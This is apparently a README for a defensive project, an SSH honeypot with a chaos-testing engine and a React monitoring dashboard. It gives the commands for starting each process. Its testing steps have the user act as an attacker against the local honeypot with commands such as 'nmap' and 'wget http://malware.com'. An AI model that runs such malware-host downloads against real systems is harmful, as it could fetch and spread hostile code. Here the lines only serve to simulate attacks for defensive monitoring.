# Running the Adaptive Chaos Dashboard

To see the full system in action, you need to run three separate processes. Open three terminal windows in the project root:

### 1. The SSH Honeypot & Chaos Engine
This handles the SSH connections and runs the Docker-based chaos experiments.
```bash
source venv/bin/activate
export GROK_API_KEY="your_grok_api_key_here"
python3 -m core.main
```

### 2. The REST API Backend
This serves the data from the SQLite database to the React dashboard.
```bash
source venv/bin/activate
python3 -m uvicorn core.api.server:app --reload --port 8000
```

### 3. The React Dashboard Frontend
The visual interface to monitor everything.
```bash
cd dashboard
npm run dev
```
Once started, open **[http://localhost:5173](http://localhost:5173)** in your browser.

---

## How to Test and See Data
1.  **Attack the Honeypot**: In a 4th terminal, run: `ssh root@localhost -p 2222`.
2.  **Run Commands**: Execute commands like `netstat`, `nmap`, or `wget http://malware.com`.
3.  **Watch the Dashboard**: 
    - The **Live Threat Feed** will catch the commands instantly.
    - The **Overview Hub** will update the threat and session counts.
    - If a threat is high enough, the **Adaptive Validation** tab will show the Docker-based stress test results!
